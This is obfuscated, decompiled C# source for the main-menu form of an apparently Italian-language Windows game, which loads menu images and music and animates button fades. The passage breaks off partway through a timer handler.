using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class GForm1 : Form
{
	private int int_0;

	private int int_1;

	private float float_0;

	private bool bool_0;

	private bool bool_1;

	private IContainer icontainer_0;

	private bool bool_2;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("FadeGame")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox3")]
	private PictureBox pictureBox_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox4")]
	private PictureBox pictureBox_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox5")]
	[CompilerGenerated]
	private PictureBox pictureBox_4;

	[AccessedThroughProperty("MemoryCleaner")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_1;

	internal virtual PictureBox PictureBox_0
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_1;
			Timer val = default(Timer);
			while (true)
			{
				int num = -707614182;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x969C5252u) % 9u)
					{
					case 8u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = 1076907211;
							num6 = 1076907211;
						}
						else
						{
							num5 = 335960586;
							num6 = 335960586;
						}
						num = num5 ^ ((int)num2 * -906819927);
						continue;
					}
					case 7u:
						val = timer_0;
						num = (int)((num2 * 179577366) ^ 0x2E1ACB44);
						continue;
					case 6u:
						GForm1.smethod_80(val, eventHandler_);
						num = (int)((num2 * 1661842681) ^ 0x6CB82302);
						continue;
					case 4u:
					{
						int num3;
						int num4;
						if (val != null)
						{
							num3 = 57406928;
							num4 = 57406928;
						}
						else
						{
							num3 = 1555143984;
							num4 = 1555143984;
						}
						num = num3 ^ (int)(num2 * 1832258866);
						continue;
					}
					case 3u:
						val = timer_0;
						num = (int)(num2 * 1228310461) ^ -1218332464;
						continue;
					case 2u:
						GForm1.smethod_81(val, eventHandler_);
						num = ((int)num2 * -1339090194) ^ 0x31743DE;
						continue;
					case 1u:
						timer_0 = value;
						num = -1108079470;
						continue;
					default:
						return;
					case 0u:
						break;
					case 5u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_005b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0061: Expected O, but got Unknown
			EventHandler eventHandler_ = method_2;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = 1546170582;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x52B35030u) % 11u)
					{
					case 9u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = (int)((num2 * 157131399) ^ 0x6D1314E8);
						continue;
					case 8u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = (int)(num2 * 1797963290) ^ -892976445;
						continue;
					case 6u:
						mouseEventHandler_ = new MouseEventHandler(method_4);
						num = (int)(num2 * 1829078702) ^ -879915528;
						continue;
					case 5u:
						pictureBox_1 = value;
						num = 1388474932;
						continue;
					case 4u:
					{
						val = pictureBox_1;
						int num5;
						int num6;
						if (val != null)
						{
							num5 = -659441691;
							num6 = -659441691;
						}
						else
						{
							num5 = -76383000;
							num6 = -76383000;
						}
						num = num5 ^ ((int)num2 * -1468757201);
						continue;
					}
					case 3u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)(num2 * 950101029) ^ -1861681946;
						continue;
					case 2u:
						eventHandler_2 = method_3;
						num = (int)((num2 * 2022269917) ^ 0x673E9CA2);
						continue;
					case 1u:
					{
						val = pictureBox_1;
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -2097402088;
							num4 = -2097402088;
						}
						else
						{
							num3 = -649318848;
							num4 = -649318848;
						}
						num = num3 ^ (int)(num2 * 919344556);
						continue;
					}
					case 0u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -491446691) ^ -742670485;
						continue;
					default:
						return;
					case 10u:
						break;
					case 7u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0064: Expected O, but got Unknown
			EventHandler eventHandler_ = method_5;
			PictureBox val = default(PictureBox);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			EventHandler eventHandler_2 = default(EventHandler);
			while (true)
			{
				int num = 1554437287;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x6182ED2Bu) % 14u)
					{
					case 13u:
						val = pictureBox_2;
						num = (int)(num2 * 972394416) ^ -715971360;
						continue;
					case 12u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = ((int)num2 * -1824889897) ^ -1581940923;
						continue;
					case 10u:
						pictureBox_2 = value;
						num = 225493862;
						continue;
					case 9u:
						mouseEventHandler_ = new MouseEventHandler(method_7);
						num = ((int)num2 * -1033883975) ^ 0x54447693;
						continue;
					case 8u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -437926860) ^ 0x7DE26379;
						continue;
					case 7u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = (int)((num2 * 844679118) ^ 0x2A434E4);
						continue;
					case 6u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = ((int)num2 * -441761543) ^ 0x39C6B391;
						continue;
					case 5u:
					{
						int num5;
						int num6;
						if (val != null)
						{
							num5 = -1403665952;
							num6 = -1403665952;
						}
						else
						{
							num5 = -601262967;
							num6 = -601262967;
						}
						num = num5 ^ (int)(num2 * 1501008325);
						continue;
					}
					case 4u:
						eventHandler_2 = method_6;
						num = ((int)num2 * -1806160303) ^ -1151071864;
						continue;
					case 3u:
					{
						val = pictureBox_2;
						int num3;
						int num4;
						if (val != null)
						{
							num3 = 1648338263;
							num4 = 1648338263;
						}
						else
						{
							num3 = 1247355425;
							num4 = 1247355425;
						}
						num = num3 ^ (int)(num2 * 764496184);
						continue;
					}
					case 2u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 870670528) ^ -693243777;
						continue;
					case 0u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 622778438) ^ -921821092;
						continue;
					default:
						return;
					case 11u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0104: Unknown result type (might be due to invalid IL or missing references)
			//IL_010a: Expected O, but got Unknown
			EventHandler eventHandler_ = method_8;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = -1692197810;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x9DE85DE8u) % 13u)
					{
					case 12u:
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						num = ((int)num2 * -1138624861) ^ -297959632;
						continue;
					case 11u:
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = (int)((num2 * 2106444338) ^ 0x32CF44A7);
						continue;
					case 10u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						num = (int)((num2 * 282200065) ^ 0x7486D7F1);
						continue;
					case 9u:
						pictureBox_3 = value;
						num = -287970653;
						continue;
					case 8u:
					{
						int num5;
						int num6;
						if (val == null)
						{
							num5 = -396097926;
							num6 = -396097926;
						}
						else
						{
							num5 = -497497142;
							num6 = -497497142;
						}
						num = num5 ^ (int)(num2 * 1086219463);
						continue;
					}
					case 7u:
						val = pictureBox_3;
						num = ((int)num2 * -480307439) ^ -621468843;
						continue;
					case 6u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = (int)(num2 * 1920440248) ^ -656661271;
						continue;
					case 5u:
					{
						val = pictureBox_3;
						int num3;
						int num4;
						if (val == null)
						{
							num3 = 2004495261;
							num4 = 2004495261;
						}
						else
						{
							num3 = 242902613;
							num4 = 242902613;
						}
						num = num3 ^ (int)(num2 * 2104371737);
						continue;
					}
					case 4u:
						mouseEventHandler_ = new MouseEventHandler(method_10);
						num = (int)((num2 * 908099122) ^ 0x215D04C2);
						continue;
					case 2u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -415649966) ^ 0x30D2A3BC;
						continue;
					case 1u:
						eventHandler_2 = method_9;
						num = (int)((num2 * 1445777911) ^ 0x2CDAD59A);
						continue;
					default:
						return;
					case 0u:
						break;
					case 3u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual PictureBox PictureBox_4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
			//IL_00db: Expected O, but got Unknown
			EventHandler eventHandler_ = method_11;
			PictureBox val = default(PictureBox);
			EventHandler eventHandler_2 = default(EventHandler);
			MouseEventHandler mouseEventHandler_ = default(MouseEventHandler);
			while (true)
			{
				int num = -1028191972;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xCAFC04CFu) % 10u)
					{
					case 9u:
					{
						val = pictureBox_4;
						int num5;
						int num6;
						if (val == null)
						{
							num5 = 1876625727;
							num6 = 1876625727;
						}
						else
						{
							num5 = 952860900;
							num6 = 952860900;
						}
						num = num5 ^ (int)(num2 * 305630456);
						continue;
					}
					case 7u:
						eventHandler_2 = method_12;
						num = (int)(num2 * 162112317) ^ -715796965;
						continue;
					case 6u:
						GForm1.smethod_86((Control)(object)val, eventHandler_2);
						num = (int)((num2 * 471583738) ^ 0x956620B);
						continue;
					case 5u:
						GForm1.smethod_82((Control)(object)val, eventHandler_);
						GForm1.smethod_83((Control)(object)val, eventHandler_2);
						GForm1.smethod_84((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -333818850) ^ 0x23AD6F65;
						continue;
					case 4u:
						GForm1.smethod_87((Control)(object)val, mouseEventHandler_);
						num = ((int)num2 * -744829648) ^ 0x1DDDCDC7;
						continue;
					case 3u:
						GForm1.smethod_85((Control)(object)val, eventHandler_);
						num = ((int)num2 * -1664830719) ^ -326599590;
						continue;
					case 1u:
					{
						mouseEventHandler_ = new MouseEventHandler(method_13);
						val = pictureBox_4;
						int num3;
						int num4;
						if (val != null)
						{
							num3 = -691229059;
							num4 = -691229059;
						}
						else
						{
							num3 = -2065727432;
							num4 = -2065727432;
						}
						num = num3 ^ ((int)num2 * -1614160463);
						continue;
					}
					case 0u:
						pictureBox_4 = value;
						num = -1500839074;
						continue;
					default:
						return;
					case 8u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_16;
			Timer val = default(Timer);
			while (true)
			{
				int num = 25371436;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x23B8906Eu) % 9u)
					{
					case 7u:
						GForm1.smethod_80(val, eventHandler_);
						num = ((int)num2 * -221831102) ^ 0x4823CFCA;
						continue;
					case 6u:
						val = timer_1;
						num = ((int)num2 * -1957797636) ^ -1407187469;
						continue;
					case 5u:
						val = timer_1;
						num = (int)(num2 * 1946396690) ^ -414812232;
						continue;
					case 4u:
						timer_1 = value;
						num = 1352391078;
						continue;
					case 3u:
						GForm1.smethod_81(val, eventHandler_);
						num = ((int)num2 * -1115326286) ^ 0x4B230787;
						continue;
					case 2u:
					{
						int num5;
						int num6;
						if (val == null)
						{
							num5 = -1640152584;
							num6 = -1640152584;
						}
						else
						{
							num5 = -1847478744;
							num6 = -1847478744;
						}
						num = num5 ^ ((int)num2 * -1025742627);
						continue;
					}
					case 1u:
					{
						int num3;
						int num4;
						if (val == null)
						{
							num3 = -972795158;
							num4 = -972795158;
						}
						else
						{
							num3 = -994756839;
							num4 = -994756839;
						}
						num = num3 ^ (int)(num2 * 590258677);
						continue;
					}
					default:
						return;
					case 0u:
						break;
					case 8u:
						return;
					}
					break;
				}
			}
		}
	}

	public GForm1()
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		while (true)
		{
			int num = -841058396;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC2C535D9u) % 7u)
				{
				case 6u:
					num = (int)((num2 * 1985060937) ^ 0x5009DF9);
					continue;
				case 5u:
					bool_1 = false;
					bool_2 = false;
					method_17();
					num = ((int)num2 * -973525203) ^ 0x5C210670;
					continue;
				case 4u:
					GForm1.smethod_9((Form)(object)this, new FormClosingEventHandler(method_15));
					int_0 = 0;
					int_1 = 0;
					float_0 = 0.3f;
					bool_0 = false;
					num = ((int)num2 * -255792760) ^ -705175788;
					continue;
				case 3u:
					num = ((int)num2 * -865912957) ^ 0x40B439FB;
					continue;
				case 2u:
					GForm1.smethod_8((Form)(object)this, (EventHandler)method_0);
					num = (int)((num2 * 40111317) ^ 0x423874B2);
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Class3_0.GForm1_0);
	}

	private void method_0(object sender, EventArgs e)
	{
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 2106550182;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x592D8DE7u) % 50u)
				{
				case 49u:
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\main_menu_theme.mp3"));
					num = ((int)num2 * -1547288484) ^ 0x7AF33BD7;
					continue;
				case 48u:
					num = ((int)num2 * -1185405207) ^ -1472028802;
					continue;
				case 47u:
					GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
					num = (int)(num2 * 1185368563) ^ -2007681756;
					continue;
				case 46u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png"));
					num = (int)(num2 * 2005766226) ^ -1997186818;
					continue;
				case 45u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = -568816603;
						num6 = -568816603;
					}
					else
					{
						num5 = -401778669;
						num6 = -401778669;
					}
					num = num5 ^ ((int)num2 * -911226141);
					continue;
				}
				case 44u:
					num = (int)(num2 * 1270904783) ^ -1041487503;
					continue;
				case 43u:
					GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
					num = ((int)num2 * -1433552139) ^ 0x2D33C980;
					continue;
				case 42u:
					num = (int)(num2 * 1168645397) ^ -2003297340;
					continue;
				case 41u:
					GForm1.smethod_20((object)int_0);
					num = ((int)num2 * -1973851316) ^ 0xA266497;
					continue;
				case 40u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png"));
					num = (int)(num2 * 584736315) ^ -1972467289;
					continue;
				case 39u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_gli_altri.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\fai_un_duello.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\dark_story.jpg"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\horror_music.mp3"));
					num = (int)(num2 * 2059821212) ^ -1245982721;
					continue;
				case 38u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\schermata_omegle.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\marco_introduzione.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Music\\introduction_start_music.mp3"));
					num = ((int)num2 * -547556249) ^ 0x232C323C;
					continue;
				case 37u:
					flag2 = GClass1.bool_1;
					num = (int)(num2 * 1870643751) ^ -2075991713;
					continue;
				case 36u:
				{
					int num7;
					int num8;
					if (!GClass1.bool_1)
					{
						num7 = -155852396;
						num8 = -155852396;
					}
					else
					{
						num7 = -2040265974;
						num8 = -2040265974;
					}
					num = num7 ^ (int)(num2 * 1183186558);
					continue;
				}
				case 35u:
					num = (int)((num2 * 1172552374) ^ 0x21DB4B40);
					continue;
				case 34u:
					GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")), 0.1f));
					num = (int)((num2 * 1199442393) ^ 0x29A0B9B5);
					continue;
				case 33u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = (int)((num2 * 634002181) ^ 0x5FEEA44);
					continue;
				case 32u:
					GForm1.smethod_19();
					num = (int)(num2 * 1298347644) ^ -1825475127;
					continue;
				case 30u:
					GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")), 0.1f));
					GForm1.smethod_16((Control)(object)PictureBox_2, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")), 0.1f));
					num = ((int)num2 * -325948745) ^ 0x6FD981F9;
					continue;
				case 29u:
					GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")), 0.1f));
					num = (int)(num2 * 1983107447) ^ -2059844462;
					continue;
				case 28u:
					num = ((int)num2 * -522179457) ^ 0x56A3690D;
					continue;
				case 27u:
					GForm1.smethod_12(GForm1.smethod_11(), ProcessPriorityClass.RealTime);
					num = ((int)num2 * -334079144) ^ -1304287895;
					continue;
				case 26u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png"));
					num = ((int)num2 * -1877174496) ^ -450811996;
					continue;
				case 25u:
					num = (int)(num2 * 2090936829) ^ -1835532201;
					continue;
				case 24u:
					GForm1.smethod_18(Timer_1);
					num = ((int)num2 * -2058946670) ^ 0x31DCBD28;
					continue;
				case 23u:
					GForm1.smethod_18(Timer_0);
					num = ((int)num2 * -2052749046) ^ 0x6B5B44EC;
					continue;
				case 22u:
					num = ((int)num2 * -1980604409) ^ 0x13B2C753;
					continue;
				case 21u:
					GClass1.smethod_0();
					num = (int)(num2 * 1770897346) ^ -424287559;
					continue;
				case 20u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png"));
					num = ((int)num2 * -534824239) ^ 0x315F4782;
					continue;
				case 19u:
					flag = !GClass1.bool_1;
					num = (int)(num2 * 1101801375) ^ -1727415227;
					continue;
				case 18u:
					GForm1.smethod_20((object)int_1);
					GForm1.smethod_20((object)float_0);
					num = (int)((num2 * 2007750793) ^ 0x5D0EC090);
					continue;
				case 17u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png"));
					num = ((int)num2 * -224815642) ^ -780745640;
					continue;
				case 16u:
					GClass1.smethod_1().method_0();
					num = (int)((num2 * 935545578) ^ 0x4AD99441);
					continue;
				case 15u:
					num = 752563566;
					continue;
				case 14u:
					GClass3.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data"));
					num = ((int)num2 * -615044701) ^ 0x2851A38;
					continue;
				case 13u:
					bool_0 = true;
					bool_1 = false;
					num = ((int)num2 * -1930449681) ^ -928818063;
					continue;
				case 12u:
					GForm1.smethod_19();
					num = ((int)num2 * -1202885796) ^ 0x3A67A29C;
					continue;
				case 11u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg"));
					num = (int)((num2 * 10226308) ^ 0x7556073D);
					continue;
				case 10u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png"));
					num = (int)(num2 * 1241140819) ^ -1626029383;
					continue;
				case 9u:
					num = 181285729;
					continue;
				case 8u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					num = ((int)num2 * -151526815) ^ 0x1E17361C;
					continue;
				case 7u:
					num = 1496585716;
					continue;
				case 5u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png"));
					num = ((int)num2 * -2031794498) ^ 0x7652967D;
					continue;
				case 4u:
					num = (int)((num2 * 741513994) ^ 0x14F07AD9);
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1503309184;
						num4 = 1503309184;
					}
					else
					{
						num3 = 2069663627;
						num4 = 2069663627;
					}
					num = num3 ^ (int)(num2 * 134160053);
					continue;
				}
				case 2u:
					GClass1.bool_1 = true;
					num = (int)((num2 * 1647716577) ^ 0x20523F24);
					continue;
				case 1u:
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu.png"));
					GClass4.smethod_0(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\con_la_cpu_hover.png"));
					num = (int)(num2 * 547280140) ^ -157327626;
					continue;
				case 0u:
					GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), 0.1f));
					num = ((int)num2 * -240228529) ^ -593113793;
					continue;
				default:
					return;
				case 6u:
					break;
				case 31u:
					return;
				}
				break;
			}
		}
	}

	public static Bitmap smethod_0(Image image_0, float float_1)
	{
		Bitmap val = GForm1.smethod_23(GForm1.smethod_21(image_0), GForm1.smethod_22(image_0));
		Graphics graphics_ = default(Graphics);
		ColorMatrix colorMatrix_ = default(ColorMatrix);
		Bitmap result = default(Bitmap);
		ImageAttributes imageAttributes_ = default(ImageAttributes);
		while (true)
		{
			int num = -170949470;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8826E0DAu) % 9u)
				{
				case 8u:
					graphics_ = GForm1.smethod_24((Image)(object)val);
					colorMatrix_ = GForm1.smethod_25();
					num = (int)((num2 * 1950031030) ^ 0x3C22245B);
					continue;
				case 7u:
					result = val;
					num = ((int)num2 * -743472439) ^ -1890003116;
					continue;
				case 6u:
					num = ((int)num2 * -2004724472) ^ -1448475722;
					continue;
				case 5u:
					GForm1.smethod_26(colorMatrix_, float_1);
					imageAttributes_ = GForm1.smethod_27();
					num = (int)((num2 * 690044378) ^ 0x287FB12E);
					continue;
				case 4u:
					GForm1.smethod_28(imageAttributes_, colorMatrix_, (ColorMatrixFlag)0, (ColorAdjustType)1);
					num = ((int)num2 * -1193482101) ^ -1389750495;
					continue;
				case 1u:
					GForm1.smethod_30(graphics_);
					num = (int)(num2 * 1382189026) ^ -1770948669;
					continue;
				case 0u:
					GForm1.smethod_29(graphics_, image_0, new Rectangle(0, 0, GForm1.smethod_21((Image)(object)val), GForm1.smethod_22((Image)(object)val)), 0, 0, GForm1.smethod_21(image_0), GForm1.smethod_22(image_0), (GraphicsUnit)2, imageAttributes_);
					num = (int)(num2 * 1015897194) ^ -295036534;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		if (((int_0 <= 15) & (int_1 == 0)) | ((int_0 <= 9) & (int_1 != 0)))
		{
			goto IL_036d;
		}
		goto IL_0747;
		IL_0747:
		int num = 1561175145;
		goto IL_0674;
		IL_0674:
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x79BF76A5u) % 48u)
			{
			case 47u:
				num = (int)(num2 * 113100562) ^ -961463318;
				continue;
			case 46u:
				num = (int)((num2 * 163701798) ^ 0x436D1AB);
				continue;
			case 45u:
				num = (int)((num2 * 1706109550) ^ 0x4BFB4D69);
				continue;
			case 44u:
				GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), float_0));
				num = ((int)num2 * -1498613789) ^ -305936252;
				continue;
			case 43u:
			{
				int num11;
				int num12;
				if (!flag)
				{
					num11 = -1342084312;
					num12 = -1342084312;
				}
				else
				{
					num11 = -667063046;
					num12 = -667063046;
				}
				num = num11 ^ ((int)num2 * -1521073058);
				continue;
			}
			case 42u:
			{
				int num7;
				int num8;
				if (int_1 != 0)
				{
					num7 = 807869693;
					num8 = 807869693;
				}
				else
				{
					num7 = 1576416485;
					num8 = 1576416485;
				}
				num = num7 ^ (int)(num2 * 112980294);
				continue;
			}
			case 41u:
				num = 545656279;
				continue;
			case 40u:
				checked
				{
					int_1++;
					int_0 = 0;
				}
				num = (int)(num2 * 175400383) ^ -1986081680;
				continue;
			case 39u:
				num = ((int)num2 * -841357659) ^ -781046471;
				continue;
			case 38u:
				flag3 = int_1 == 1;
				num = ((int)num2 * -1454797773) ^ 0x4117022E;
				continue;
			case 37u:
			{
				ref float reference5 = ref float_0;
				reference5 = (float)((double)reference5 + 0.3);
				num = ((int)num2 * -1944233348) ^ 0x54D1832;
				continue;
			}
			case 36u:
				break;
			case 35u:
			{
				ref float reference4 = ref float_0;
				reference4 = (float)((double)reference4 + 0.3);
				num = (int)((num2 * 1988491221) ^ 0x6A6430A0);
				continue;
			}
			case 33u:
			{
				int num9;
				int num10;
				if (flag4)
				{
					num9 = 50050986;
					num10 = 50050986;
				}
				else
				{
					num9 = 156235645;
					num10 = 156235645;
				}
				num = num9 ^ ((int)num2 * -1727398457);
				continue;
			}
			case 32u:
			{
				ref float reference3 = ref float_0;
				reference3 = (float)((double)reference3 + 0.3);
				num = (int)((num2 * 41637234) ^ 0x3C7BB55B);
				continue;
			}
			case 31u:
				GForm1.smethod_16((Control)(object)PictureBox_0, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\logo.png")));
				GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
				num = ((int)num2 * -1728803072) ^ 0x1939AFF5;
				continue;
			case 30u:
				GForm1.smethod_32(Timer_0, 50);
				num = ((int)num2 * -264420195) ^ 0x41B51BEA;
				continue;
			case 29u:
				float_0 = 0.3f;
				num = (int)(num2 * 671404405) ^ -1460819694;
				continue;
			case 28u:
				flag4 = int_1 == 5;
